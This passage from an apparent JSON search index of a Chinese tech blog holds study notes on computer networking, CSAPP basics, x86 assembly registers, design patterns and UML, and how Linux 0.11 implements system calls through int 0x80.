==从数据收发的角度来看，发起连接的一方是客户端，等待连接的一方是服务器。==\n这个区别体现在如何调用 Socket 库上。首先，客户端的数据收发需要经过下面 4 个阶段。\n（1）创建套接字（创建套接字阶段）\n（2）用管道连接服务器端的套接字（连接阶段）\n（3）收发数据（收发阶段）\n（4）断开管道并删除套接字（断开阶段）\n相对地，==服务器是将阶段（2）改成了等待连接==，具体如下。\n（1）创建套接字（创建套接字阶段）\n（2-1）将套接字设置为等待连接状态（等待连接阶段）\n（2-2）接受连接（接受连接阶段）\n（3）收发数据（收发阶段）\n（4）断开管道并删除套接字（断开阶段）\n要确定某个套接字时，不仅使用服务器端套接字对应的端口号，还同时使用客户端的端口号再加上 IP 地址，总共使用下面 4 种信息来进行判断（图 6.4）\n客户端 IP 地址 客户端端口号 服务器 IP 地址 服务器端口号 ==使用描述符来指代套接字的原因如下==：\n（1）等待连接的套接字中没有客户端 IP 地址和端口号\n（2）使用描述符这一种信息比较简单\n6.2 服务器的接收操作 ==网卡的 MAC 模块将网络包从信号还原为数字信息，校验 FCS并存入缓冲区。==\n==网卡驱动会根据 MAC 头部判断协议类型，并将包交给相应的协议栈。==\n==协议栈的 IP 模块会检查 IP 头部，（1）判断是不是发给自己的；（2）判断网络包是否经过分片；（3）将包转交给 TCP 模块或 UDP模块。==\n==如果收到的是发起连接的包，则 TCP 模块会（1）确认 TCP 头部的控制位 SYN；（2）检查接收方端口号；（3）为相应的等待连接套接字复制一个新的副本；（4）记录发送方 IP 地址和端口号等信息。==\n==收到数据包时，TCP 模块会（1）根据收到的包的发送方 IP 地址、发送方端口号、接收方 IP 地址、接收方端口号找到相对应的套接字；（2）将数据块拼合起来并保存在接收缓冲区中；（3）向客户端返回 ACK。==\n6.3 Web 服务器程序解释请求消息并作出响应 ==将请求的 URI 转换为实际的文件名==\n==运行 CGI 程序==\n什么是CGI程序？ CGI程序，就是放置在服务器上的一段可执行程序。作为HTTP服务器的时候，客户端可以通过GET或者POST请求来调用这可执行程序。\n==Web 服务器的访问控制==\n==返回响应消息==\n首先，Web 服务器调用 Socket 库的==write==，将响应消息交给协议栈。这时，需要告诉协议栈这个响应消息应该发给谁，但我们并不需要直接告知客户端的 IP 地址等信息，而是只需要给出表示通信使用的套接字的描述符就可以了。套接字中保存了所有的通信状态，其中也包括通信对象的信息，因此只要有描述符就万事大吉了。\n接下来，协议栈会将数据拆分成多个网络包，然后加上头部发送出去。这些包中包含接收方客户端的地址，它们将经过交换机和路由器的转发，通过互联网最终到达客户端。==（图6.7）==\n6.4 浏览器接收响应消息并显示内容 通过响应的数据类型判断其中的内容\n原则上可以根据响应消息开头的 ==Content-Type== 头部字段的值来进行判断。这个值一般是下面这样的字符串。\nContent-Type: text/html\n其中“/”左边的部分称为“主类型”，表示数据的大分类；右边的“子类型”表示具体的数据类型。在上面的例子中，主类型是 text，子类型是html。主类型和子类型的含义都是事先确定好的 A，表 6.1 列出了其中主要的一些类型。上面例子中的数据类型表示遵循 HTML 规格的 HTML 文档。\n此外，当数据类型为文本时，还需要判断编码方式，这时需要用 ==charset== 附加表示文本编码方式的信息，内容如下。\nContent-Type: text/html; charset=utf-8\n附录　网络包的旅程 ","permalink":"https://chance7bin.github.io/posts/basic/network/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/","summary":"写在前面 该篇博客是我在看《网络是怎样连接的》这本书时记录的学习笔记✍~~ 第1章 浏览器生成消息——探索浏览器内部 1.1 生成HTTP请求消息 1.2 向 DNS 服","title":"网络是怎样连接的"},{"content":"系统硬件组成 运行hello程序 1.在键盘上输入命令“./hello”后，shell程序将字符逐一读入寄存器，再把它放到内存中。\n2.回车时，shell执行一系列指令来加载可执行的hello文件，这些指令将hello目标文件中的代码和数据从磁盘复制到主存。\n3.一旦目标文件hello中的代码和数据被加载到主存，处理器就开始执行hello程序的main程序中的机器语言指令。这些指令将“hello world\\n”字符串中的字节从主存复制到寄存器文件，再从寄存器文件中复制到显示设备，最终显示在屏幕上。\n操作系统管理硬件 操作系统是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统（图1-11）。\n文件是对 I/O 设备的抽象表示，虛拟内存是对主存和磁盘 I/O 设备的抽象表示，进程则是对处理器、主存和 I/O 设备的抽象表示（图1-11）。\n进程 **操作系统保持跟踪进程运行所需的所有状态信息。这种状态，也就是上下文，**包括许多信息，比如PC 和奇存器文件的当前值，以及主存的内容。在任何一个时刻，单处理器系统都只能执行一个进程的代码。当操作系统决定要把控制权从当前进程转移到某个新进程时，就会进行上下文切换，即保存当前进程的上下文、恢复新进程的上下文，然后将控制权传递到新进程。新进程就会从它上次停止的地方开始。图1-12 展示了示例程序运行场景的基本理念。 示例场景中有两个并发的进程：shell 进程和 hello 进程。最开始，只有shell 进程在运行，即等待命令行上的输入。当我们让它运行 hello 程序时，shell 通过调用一个专门的函数，即系统调用，来执行我们的请求，系统调用会将控制权传递给操作系统。操作系统保存shell 进程的上下文，创建一个新的 hello 进程及其上下文，然后将控制权传给新的 hello进程。hello进程终止后，操作系统恢复 shell 进程的上下文，并将控制权传回给它，shell 进程会继续等待下一个命令行输人。 如图 1-12所示，**从一个进程到另一个进程的转换是由操作系统内核(kernel)管理的。**内核是操作系统代码常驻主存的部分。当应用程序需要操作系统的某些操作时，比如读写文件，它就执行一条特殊的系统调用(system call)指令，将控制权传递给内核。然后内核执行被请求的操作并返回应用程序。注意，内核不是一个独立的进程。相反，它是系统管理全部进程所用代码和数据结构的集合。\n内存指引错误 1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct { int a[2]; double d; } struct_t; double fun(int i){ volatile struct_t s; s.d = 3.14; s.a[i] = 1073741824; return s.d; } 内存系统表现 ","permalink":"https://chance7bin.github.io/posts/basic/csapp/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/","summary":"系统硬件组成 运行hello程序 1.在键盘上输入命令“./hello”后，shell程序将字符逐一读入寄存器，再把它放到内存中。 2.回车时，s","title":"计算机系统漫游"},{"content":"x86汇编 操作数排列是从源（右）到目的（左）\n1 2 3 4 5 6 7 8 9 10 assume cs:codesg ;假设代码段的名称为codesg codesg segment ;定义一个codesg段 mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax,4c00h int 21h codesg ends ;codesg段结束 end ;是个伪指令，程序的结束标记 AT\u0026amp;T汇编 1.寄存器\n引用寄存器要在寄存器号前加百分号%,如“movl %eax, %ebx\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 8个32-bit寄存器 %eax，%ebx，%ecx，%edx，%edi，%esi，%ebp，%esp 8个16-bit寄存器 它们事实上是上面8个32-bit寄存器的低16位： %ax，%bx，%cx，%dx，%di，%si，%bp，%sp 8个8-bit寄存器 %ah，%al，%bh，%bl，%ch，%cl，%dh，%dl 它们事实上是寄存器%ax，%bx，%cx，%dx的高8位和低8位 6个段寄存器 %cs(code)，%ds(data)，%ss(stack), %es，%fs，%gs 3个控制寄存器 %cr0，%cr2，%cr3； 6个debug寄存器 %db0，%db1，%db2，%db3，%db6，%db7； 2个测试寄存器 %tr6，%tr7； 8个浮点寄存器栈 %st(0)，%st(1)，%st(2)，%st(3)，%st(4)，%st(5)，%st(6)，%st(7) 2.操作数顺序\n操作数排列是从源（左）到目的（右）\n1 movl %eax(源）, %ebx(目的） (ebx) = (eax) 要动手实践的事情：\n1.标出来的实验\n2.字母大小写转换 看DOSBox中的内存状况\n3.低八位、高八位 DOSBox中的内存状况以及栈中的状况\n寄存器及其作用 寄存器以e开头或r开头，来代表不同的架构，其中e开头表示32位，r开头表示64位\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 堆栈是一种简单的数据结构，是一种只允许在其一端进行插入或删除的线性表。 允许插入或删除操作的一端称为栈顶，另一端称为栈底，对堆栈的插入和删除操作被称入栈和出栈。 有一组CPU指令可以实现对进程的内存实现堆栈访问。其中，POP指令实现出栈操作，PUSH指令实现入栈操作。 CPU的ESP寄存器存放当前线程的栈顶指针，EBP寄存器中保存当前线程的栈底指针。 CPU的EIP寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。 ECX一般用来当作计数器 EDX是数据寄存器 EAX是累加器 EBX是基址寄存器, ESI是源变址寄存器 EDI是目的变址寄存器 ESP是堆栈指针寄存器 EBP是基址指针寄存器,其中ESP和EBP一般是针对堆栈面言 CS:IP 存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行\nCS Code segment\nIP instruction Pointer\nPC\nPC是非intel厂家对IP的称呼，也就是说PC起始跟CS:IP是一回事儿。\nPC 是计算机科学中使用的一个术语。IP 是 x86 兼容 CPU 中的一个寄存器。\n简单来说，在 x86 兼容 CPU 上，CS 段寄存器和 IP 寄存器两个寄存器就是实现计算机科学中的 PC 这个概念的具体设施。\nAX\nBX\nCX\nDX\nDS\nSS\nSP\nSI\nDI\nESP（Extended Stack Pointer）为扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针。与之对应的是EBP（Extended Base Pointer），扩展基址指针寄存器，也被称为帧指针寄存器，用于存放函数栈底指针。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","summary":"x86汇编 操作数排列是从源（右）到目的（左） 1 2 3 4 5 6 7 8 9 10 assume cs:codesg ;假设代码段的名称为codesg codesg segment ;定义一个codesg段 mov ax,0123H mov bx,0456H add ax,bx","title":"相关知识"},{"content":"写在前面 这个专栏记录学习设计模式的一些笔记，相关代码在GitHub上\n面向对象基础 字段和属性 变量私有的叫字段，公有的是属性，那么对于方法而言，同样也就有私有方法和公有方法了，一般无需要对外界公开的方法都应该设置其修饰符为 private（私有）。这才有利于”封装“\n继承的使用场景 对象的继承代表了一种”is-a“的关系，如果两个对象A和B，可以描述为”B是A“，则表明B可以继承A。”猫是哺乳动物“，就说明了猫与哺乳动物之间继承与被继承的关系。\n抽象类和接口的区别 从表象上来说，抽象类可以给出一些成员的实现，接口却不包含成员的实现，抽象类的抽象成员可被子类部分实现，接口的成员需要实现类完全实现，一个类只能继承一个抽象类，但可实现多个接口等等。但这些都是从两者的形态上去区分的。还有三点是能帮助我们去区分抽象类和接口的。\n**第一，类是对对象的抽象；抽象类是对类的抽象；接口是对行为的抽象。**接口是对类的局部（行为）进行的抽象，而抽象类是对类整体（字段、属性、方法〉的抽象。如果只关注行为抽象，那么也可以认为接口就是抽象类。总之，不论是接口、抽象类、类甚至对象，都是在不同层次、不同角度进行抽象的结果，它们的共性就是抽象。\n第二，如果行为跨越不同类的对象，可使用接口；对于一些相似的类对象，用继承抽象类。\n**第三，从设计角度讲，抽象类是从子类中发现了公共的东西，泛化出父类，然后子类继承父类，而接口是根本不知子类的存在，方法如何实现还不确认，预先定义。**这里说明的是抽象类和接口设计的思维过程。先是有一个Cat类，然后再有一个 Dog类，观察后发现它们有类似之处，于是泛化出 Animal类，通过重构改善既有代码的设计。\nArrayList 可以根据使用大小按需动态增加，不用受事先设置其大小的控制。可以随意地添加、插入或移除某一范围元素，比数组方便。但是，ArrayList不是类型安全的。\nArrayList对于存放值类型的数据，比如 int、string型或者结构struct 的数据，用ArrayList就意味着都需要将值类型装箱为Object对象，使用集合元素时，还需要执行拆箱操作，这就带来了很大的性能损耗。\n装箱是把值类型打包到Objeet 引用类型的一个实例中，比如整型变量i被“装箱”并赋值给对象o。\n1 2 int i = 123; object o = (object) i; //boxing 拆箱是指从对象中提取值类型。此例中对象o拆箱并将其赋值给整型变量i\n1 2 o = 123; i = (int) o; //unboxing 相对于简单的赋值而言，装箱和拆箱过程需要进行大量的计算。对值类型进行装箱时，必须分配并构造一个全新的对象。其次，拆箱所需的强制转换也需要进行大量的计算。而 ArrayList集合在使用值类型数据时，其实就是在不断地做装箱和拆箱的工作。\n泛型 泛型是具有占位符（类型参数〉的类、结构、接口和方法，这些占位符是类、结构、接口和方法所存储或使用的一个或多个类型的占位符。泛型集合类可以将类型参数用作它所存储的对象的类型的占位符；类型参数作为其字段的类型和其方法的参数类型出现。\n通常情况下，都建议使用泛型集合，因为这样可以获得类型安全的直接优点而不需要从基集合类型派生并实现类型特定的成员。此外，如果集合元素为值类型，泛型集合类型的性能通常优于对应的非泛型集合类型(并优于从非泛型基集合类型派生的类型)，因为使用泛型时不必对元素进行装箱。\n委托与事件 委托是对函数的封装，可以当作给方法的特征指定一个名称。而事件则是委托的一种特殊形式，当发生有意义的事情时，事件对象处理通知过程。\n委托是一种引用方法的类型。一旦为委托分配了方法，委托将与该方法具有完全相同的行为。\nJava实现：\nUML类图 类 ”动物“矩形框，它就代表一个类（Class）。类图分三层，第一层显示类的名称，如果是抽象类，则就用斜体显示。第二层是类的特性，通常就是字段和属性。第三层是类的操作，通常是方法或行为。‘+’表示public，‘-’表示private，‘#’表示protected。\n接口 继承 继承关系用空心三角形+实线来表示\n实现接口 实现接口用空心三角形+虚线来表示\n关联 当一个类”知道“另一个类时，可以用关联(association)。关联关系用实线箭头来表示。\n聚合 聚合（Aggregation）表示一种弱的”拥有\u0026quot;关系，体现的是A对象可以包含B对象，但B对象不是A对象的一部分。聚合关系用空心的菱形+实线箭头来表示。\n合成 合成（Composition，也有翻译成“组合”的）是一种强的“拥有”关系，体现了严格的部分和整体的关系，部分和整体的生命周期一样。在这里鸟和其翅膀就是合成（组合）关系，因为它们是部分和整体的关系，并且翅膀和鸟的生命周期是相同的。合成关系用实心的菱形+实线箭头来表示。另外，合成关系的连线两端还有一个数字”1“和数字”2“，这被称为基数。表明这一端的类可以有几个实例，很显然，一个鸟应该有两只翅膀。如果一个类可能有无数个实例，则就用”n“来表示。关联关系、聚合关系也可以有基数的。\n依赖关系 动物几大特征，比如有新陈代谢，能繁殖。而动物要有生命力，需要氧气、水以及食物等。也就是说，动物依赖于氧气和水。他们之间是依赖关系（Dependency），用虚线箭头来表示。\n设计模式分类 创建型模式 工厂方法\n抽象工厂\n生成器（亦称建造者模式）\n原型\n单例\n结构型模式 适配器\n桥接\n组合\n装饰\n外观\n享元\n代理\n行为模式 责任链\n命令\n迭代器\n中介者\n备忘录\n观察者\n状态\n策略\n模板方法\n访问者\n","permalink":"https://chance7bin.github.io/posts/basic/pattern/%E5%BC%80%E7%AF%87/","summary":"写在前面 这个专栏记录学习设计模式的一些笔记，相关代码在GitHub上 面向对象基础 字段和属性 变量私有的叫字段，公有的是属性，那么对于方法而言，","title":"开篇"},{"content":"操作系统的接口与实现 相关知识 相关链接：\n【构建操作系统】全局描述符表GDT\nGDT（全居描述符表）和LDT（局部描述符表）\nGDT（Global Descriptor Table）：全局描述符表\nLDT：局部描述符表\nGDT和LDT：GDT为一级描述符表，LDT为二级描述符表\n段选择子：引用GDT和LDT中的段描述符所描述的段，是通过一个16-bit的数据结构来实现的，这个数据结构叫做Segment Selector——段选择子。它的高13位作为被引用的段描述符在GDT/LDT中的下标索引，bit 2用来指定被引用段描述符被放在GDT中还是到LDT中，bit 0和bit 1是RPL——请求特权等级，被用来做保护目的。如图所示：\ntask_struct：每个进程在内核中都有一个进程控制块(PCB)来维护进程相关的信息，Linux内核的进程控制块是task_struct结构体。Linux内核通过一个被称为进程描述符的task_struct结构体来管理进程，这个结构体包含了一个进程所需的所有信息。它定义在include/linux/sched.h文件中。\n浅析Linux下的task_struct结构体\nTSS(Task Struct Segement)：任务结构段，TSS是一个段，即一块内存，这里保存要切换的进程的cpu信息，包括各种寄存器的值、局部描述表ldt的段选择子等，切换时cpu会将这段内容存进各自对应的寄存器，然后就完成了切换。（任务切换或者说CPU状态更新实质上就是改变各个寄存器的值）\nLinux中进程、线程和fork()\n关于Linux中的线程，Linux采用了一种“偷懒”的方法，Linux没有专门的线程对象，当需要建立一个线程时，实际上内核创建的是一个进程对象，也就是task_struct，只不过这个进程对象和父进程共享了大量资源，有时也称为轻权进程（LightWeight Process）。Linux建立进程和线程的接口也一致，比如都是fork()，而通过不同的参数来指定要建立的是进程还是线程。调用fork()函数将返回两次，一次是在父进程中，一次是在子进程中，这一定会让大都数人疑惑。其实fork()就是把当前的进程对象task_struct复制一份，这样在进程队列中就多了一个进程对象，由于两个进程相同，所以调度器调度到父进程时，返回一次，调度到子进程时，返回一次。\n那么fork()调用一次返回两次的原理是什么呢？这可通过do_fork()所调用的函数copy_thread()来回答。应用程序通过fork()系统调用进入内核空间，其内核态堆栈上保存着该进程的进程上下文（即该进程的各个寄存器），通过复制父进程的内核态堆栈上的进程上下文，同时将eax置为0（如linux 1.2，*childregs = *regs; childregs-\u0026gt;eax = 0;），而父进程通过do_fork()的返回值（return last_pid）来得到fork()的返回值。\n前言 当操作系统运行到main程序中有这样一行代码\n1 if(!fork()){init();} 这是创建一个子进程，对于windows来说就是启动桌面，对于linux来说就是打开shell。这一篇文章说说操作系统的接口以及实现，即上层应用是如何穿过接口进入操作系统的\n一、接口 1.接口的定义 操作系统接口：接口表现为函数调用，又由系统提供，所以称为系统调用\n一般情况下我们有三种方式来操作计算机：\n1.命令行：即通过命令程序，linux系统中常用此种方式 2.图形按钮：通过鼠标点击等操作实现对计算机的操控。windows系统在这方面做的就非常优秀。这种方式通过消息框架程序和消息处理程序实现 3.应用程序\n不管采用何种方式，我们都需要让操作系统和应用程序之间建立联系。如何建立连接 ?\n==操作系统接口==\n接口其实是一种抽象，比如插排，它将内部的电路全部封装起来，只提供两个插口，用电设备插上就能用；不用管插座内部是如何实现的。\n操作系统接口也具有连接两个东西、屏蔽细节、方便用户使用的特点。它连接上层应用软件和底层硬件，屏蔽细节，用户直接通过程序（应用软件）使用计算机，方便用户使用。==操作系统的接口其实就是一个个函数，知道它的功能然后直接调用就行，而不用管它内核里面是怎么实现的，因为这个函数是系统调用的，所以也称为系统调用。==比如：write()、read()等等\n2.接口分类 操作系统接口的功能就是提供一个用户使用系统的界面。根据服务对象的不同，==操作系统的接口可以划分为两类：一是供用户使用的用户级接口，二是供程序使用的程序级接口。==\n操作系统中有专门响应用户控制要求的接口，负责系统与用户之间的双向信息传送\n(1)用户接口\n用户接口就是操作系统向用户提供的使用界面。分为脱机接口与交互式接口两种\n(2) 程序接口\n程序级接口是为程序访问系统资源而提供的，它由一组系统调用组成。系统调用(System Call)可以看作是由操作系统内核提供的一组广义指令。程序员在设计程序时，凡涉及到系统资源访问的操作，如文件读/写、数据输入/输出、网络传输等，都必须通过系统调用来实现。所以说，==系统调用是操作系统提供给应用程序的唯一接口。==\n从层次上来看，用户接口属于高层接口，是用户与操作系统之间的接口。而程序接口则是低级接口，是任何核外程序(包括应用程序和系统程序)与操作系统内核之间的接口。用户接口的功能最终是通过程序接口来实现的。\n二、系统调用的实现 1.系统调用 ==计算机硬件系统并不允许我们在内存中通过jmp等跳转指令直接调用操作系统内核提供的函数，因为这样有可能会导致敏感信息的泄露==\n为了确保系统的安全性，计算机硬件为我们设计了内核态和用户态的模式，内核态可以访问用户态的信息，但用户态不能访问内核态。\n用户程序的CPL（Current Privilege Level）初始化结果是3，而操作系统内核里函数的DPL（Descriptor Privilege Level）是0，所以用户对内核的访问权限不够。\nCPL寄存器表示当前程序执行在什么态，0表示内核态，3表示用户态；\nDPL寄存器表示即将访问的数据在什么段，同样0表示内核段，3表示用户段。\n每次访问数据的时候检查两个寄存器的大小关系，若DPL≥CPL，则可以访问，反之，则不能访问\n把内存分为了操作系统内核段和用户程序用户段，把在内核段执行的代码和数据称为处于内核态，把在用户段执行的代码和数据称为处于用户态，将内核程序和用户程序隔离。所以：\n内核态：处于内核态可以访问用户段和内核段的数据\n用户态：处于用户态只能访问用户段的数据而不能访问内核段的数据\n为了实现系统调用，操作系统为我们提供了用户程序调用内核函数的唯一方法：==中断指令int==。当程序执行到int指令时，int指令会将CS中的CPL修改为0，当访问内核结束之后，又将CPL重置为3继续执行用户程序。\n系统调用的核心：\n(1)用户程序中包含一段包含int指令的代码\n(2)操作系统中有中断函数表，从中可以获取中断服务函数入口地址\n(3)操作系统执行中断服务函数\nCPL是当前进程的权限级别(Current Privilege Level)，是当前正在执行的代码所在的段的特权级，存在于cs寄存器的低两位。\nRPL说明的是进程对段访问的请求权限(Request Privilege Level)，是对于段选择子而言的，每个段选择子有自己的RPL，它说明的是进程对段访问的请求权限，有点像函数参数。而且RPL对每个段来说不是固定的，两次访问同一段时的RPL可以不同。RPL可能会削弱CPL的作用，例如当前CPL=0的进程要访问一个数据段，它把段选择符中的RPL设为3，这样虽然它对该段仍然只有特权为3的访问权限。\nDPL存储在段描述符中，规定访问该段的权限级别(Descriptor Privilege Level)，每个段的DPL固定。 当进程访问一个段时，需要进程特权级检查，一般要求DPL \u0026gt;= max {CPL, RPL}\n2.具体实现 以printf为例：printf(“%d”,a)\n内核中printf()函数：\n1 2 3 4 5 6 7 8 9 10 11 12 //printf()产生格式化信息输出到标准设备stdout(1),在屏幕上显示 // 参数fmt：指定输出将采用的格式 static int printf(const char *fmt, ...) { va_list args; int i; va_start(args, fmt); write(1,printbuf,i=vsprintf(printbuf, fmt, args)); va_end(args); return i; } 在printf()内部其实是调用了系统函数write()\n1 2 3 4 ssize_t write(int fd, const void *buf, size_t count); //fd：要进行写操作的文件描述符 //buf：需要输出的缓冲区 //count：最大输出字节计数 printf()函数的形参和write()的形参是不一样的，因此如果printf(“%d”,a)能调用write函数的话，肯定要对printf的形参进行处理，使其符合write函数的格式，或者说换一种方式调用。在printf()函数里面调用write()如下所示：\n_syscall3 是一个嵌入汇编宏定义\n1 2 3 4 5 6 7 8 9 10 11 12 #define _syscall3(type,name,atype,a,btype,b,ctype,c) type name(atype a,btype b,ctype c) { long __res; __asm__ volatile (\u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (__res) : \u0026#34;0\u0026#34; (__NR_##name),\u0026#34;b\u0026#34; ((long)(a)),\u0026#34;c\u0026#34; ((long)(b)),\u0026#34;d\u0026#34; ((long)(c))); if (__res\u0026gt;=0) return (type) __res; errno=-__res; return -1; } ==分析：==\n_syscall3这个宏调用之后就是展开成上面的一段汇编代码\n比如write调用：\n1 _syscall3(int, write, int, fd, const char* buf, off_t, count) 就是将宏展开的代码中的\n1 type=int,name=write,atype=int,a=fd,btype=const char * ,b=buf,ctype=off_t,c=count; 用这些来替换,所以\n1 type name(atype a, btype b, ctype c) 就变成了\n1 int write(int fd,const char * buf, off_t count) 这样，展开的汇编代码一样跟着变。int 0x80这个中断，前面已经说过在head.s里面会重新建立idt表，之后中断就是表示根据中断号查那个表，然后获取中断服务函数的入口地址，==0x80这个中断就是进入操作系统内核，这是上层应用进入操作系统的唯一手段==，int 0x80相当于是操作系统的一个门户\n接着看_syscall3宏定义下面的代码\n1 2 3 4 5 6 7 8 9 10 11 12 long __res; //定义一个寄存器 __asm__ volatile (\u0026#34;int $0x80\u0026#34; //中断指令 : \u0026#34;=a\u0026#34; (__res) //输出，最后将eax--\u0026gt;res中，作为函数输出 : \u0026#34;0\u0026#34; (__NR_##name),\u0026#34;b\u0026#34; ((long)(a)),\u0026#34;c\u0026#34; ((long)(b)),\u0026#34;d\u0026#34; ((long)(c))); //输入 // \u0026#34;0\u0026#34;:表示使用与上面同个位置的输出相同的寄存器 eax // 将__NR_##name赋值给eax //__NR_write称为系统调用号 // 然后，把形参的a、b、c依次赋值给ebx、ecx、edx三个寄存器 if (__res\u0026gt;=0) return (type) __res; errno=-__res; return -1; 这是一段内嵌汇编，分为四部分\n1 2 3 4 5 __asm__(\u0026#34;汇编语句\u0026#34; :输出寄存器 :输入寄存器 :会被修改的寄存器 ) 详情见下面这篇文章：\nGCC 内联汇编\n__NR_write称为系统调用号\n1 2 在linux/inlcude/unistd.h中 # define __NR_write 4 所有的系统调用都是通过int 0x80这个中断来调用的,\n根据这个系统调用号来区分__NR_write表示write调用，会接着执行write对应的内核代码，__NR_read表示read调用，同理，其他的系统调用号也是如此\n在内嵌汇编中,\u0026ldquo;a\u0026quot;这种被称作==限制字符==\n1 2 3 4 5 6 7 8 \u0026#34;a\u0026#34; 将输入变量放入eax \u0026#34;b\u0026#34; 将输入变量放入ebx \u0026#34;c\u0026#34; 将输入变量放入ecx \u0026#34;d\u0026#34; 将输入变量放入edx \u0026#34;s\u0026#34; 将输入变量放入esi \u0026#34;d\u0026#34; 将输入变量放入edi \u0026#34;q\u0026#34; 将输入变量放入eax，ebx，ecx，edx中的一个 \u0026#34;r\u0026#34; 将输入变量放入通用寄存器，也就是eax，ebx，ecx，edx，esi，edi中的一个 所以，把形参的a、b、c依次赋值给ebx、ecx、edx三个寄存器\n输入完成之后就通过int 0x80这个中断号进入操作系统，int 0x80这条指令执行完之后，eax中就会存放int 0x80的返回值，然后将这个返回值赋值给__res，__res就是int write()这个系统调用的返回值。write这个系统调用也就结束了\n1 2 3 4 5 6 7 8 小结:_syscall3宏定义 格式：#define _syscall3(type,name,atype,a,btype,b,ctype,c) type 表示函数返回值，name表示函数名，后面分别是三个形参的类型和行参名。 name不同，系统调用号不同，所以调用_syscall3之后执行的代码不同，在宏里面通过 int 0x80进入系统内核并将指条指令的结果存在eax寄存器中，然后返回到宏的调用处 ==INT 0x80 指令==\nint 0x80是进入中断服务函数的一条指令，所以int 指令首先要查idt表转去哪里执行\n1 2 void sched_init(void) { set_system_gate(0x80,\u0026amp;system_call); } int 0x80对应的中断处理程序就是system_call，从这个init就知道这是一个初始化，0x80这个中断就是用后面这个system_call来处理，那么系统是怎么设置的呢？通过set_system_gate这个宏\n1 2 3 在linux/include/asm/system.h中 #define set_system_gate(n, addr) _set_gate(\u0026amp;idt[n],15,3,addr); //idt是中断向量表基址 然后在set_system_gate这个宏又调用了_set_gate这个宏，\n1 2 3 4 5 6 7 8 9 10 #define _set_gate(gate_addr,type,dpl,addr) __asm__ (\u0026#34;movw %%dx,%%axnt\u0026#34; \u0026#34;movw %0,%%dxnt\u0026#34; \u0026#34;movl %%eax,%1nt\u0026#34; \u0026#34;movl %%edx,%2\u0026#34; : : \u0026#34;i\u0026#34; ((short) (0x8000+(dpl\u0026lt;\u0026lt;13)+(type\u0026lt;\u0026lt;8))), \u0026#34;o\u0026#34; (*((char *) (gate_addr))), \u0026#34;o\u0026#34; (*(4+(char *) (gate_addr))), \u0026#34;d\u0026#34; ((char *) (addr)),\u0026#34;a\u0026#34; (0x00080000)) _set_gate这个宏的作用就是建立一个类似这样的下图表，处理函数入口点偏移=system_call,DPL就是3，段选择符就是0x0008,即CS是8\n用户态的程序如果要进入内核，必须使用0x80号中断，那么就必须先要进入idt表。用户态的CPL=3，且idt表的DPL故意设置成3，因此能够跳到idt表，跳到idt表中之后就能找到之后程序跳转的地方，也就是中断服务函数的起始地址，CS就是段选择符（8），ip就是”处理函数入口点偏移“。\n1 在setup.s中指令： jmpi 0,8 这条指令表示根据gdt表跳转到内核代码的地址0处。CS=8，ip=system_call就是跳到内核的system_call这个函数；另外如果CS=8，那么CPL=0，因为CPL是CS最低两位。也就是说当前程序的特权级变了，变成内核态的了。完整流程：初始化的时候0x80号中断的DPL设成3，让用户态的代码能跳进来，跳进来之后根据CS=8将CPL设为0，到了内核态，到了内核态就什么都能干了，将来int 0x80返回的之后，CS最后两位肯定变成3，变成用户态\n中断处理函数system_call\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 在linux/kernel/system_call.s中 nr_system_calls=72 .globl _system_call _system_call: cmpl $nr_system_calls-1,%eax ja bad_sys_call push %ds push %es push %fs pushl %edx pushl %ecx pushl %ebx //调用的参数 movl $0x10,%edx mov %dx,%ds mov %dx,%es //内核数据 movl $0x17,%edx mov %dx,%fs //fs可以找到用户数据 call _sys_call_table(,%eax,4) //a(,%eax,4)=a+4*eax pushl %eax //返回值压栈，留着ret_from_sys_call时用 ... //其他代码 ret_from_sys_call: popl %eax, 其他pop, iret 前面都是压栈和赋值，接着调用了_sys_call_table(,%eax,4)。\na(,%eax,4)=a+4_eax,所以_sys_call_table(,%eax,4)=_sys_call_table+4_%eax这是一种寻址方式。eax是系统调用号\n_sys_call_table\n1 2 3 4 5 6 7 在include/linux/sys.h中 fn_ptr sys_call_table[]= {sys_setup, sys_exit, sys_fork, sys_read, sys_write, ...}; 在include/linux/sched.h中 typedef int (fn_ptr*)(); sys_call_table是一个fn_ptr类型的全局函数表，fn_ptr是一个函数指针，4个字节，这就是_sys_call_table+4*%eax；这里为什么要*4的原因，sys_call_table的每一项都是4个字节，然后就可以根据eax来知道要调用的真正中断服务函数的入口地址了，对于write系统函数来说，就sys_write\n系统调用进入内核态之后的过程：\nprintf -\u0026gt;_syscall3 -\u0026gt;write -\u0026gt; int 0x80 -\u0026gt; system_call -\u0026gt; sys_call_table -\u0026gt; sys_write\nprintf通用_syscall3这个宏调用write函数，在write函数里面用system_call来处理int 0x80,在system_call中会调用system_call_table这个表，根据eax中存储的系统调用号就可以找到真正的sys_write了。\nmain中，CPL=3，int 0x80的DPL也设置成3，这个时候就可以传过去，然后CPL就被设置成0，访问哪个地方都可以\n总结 操作系统接口就是由C语言代码和由操作系统提供的一些重要函数组成。又因为这些函数调用时系统提供的，所以又叫系统调用(system_call)。我们通过系统调用就能在应用程序和操作系统之间建立连接\n进程与线程 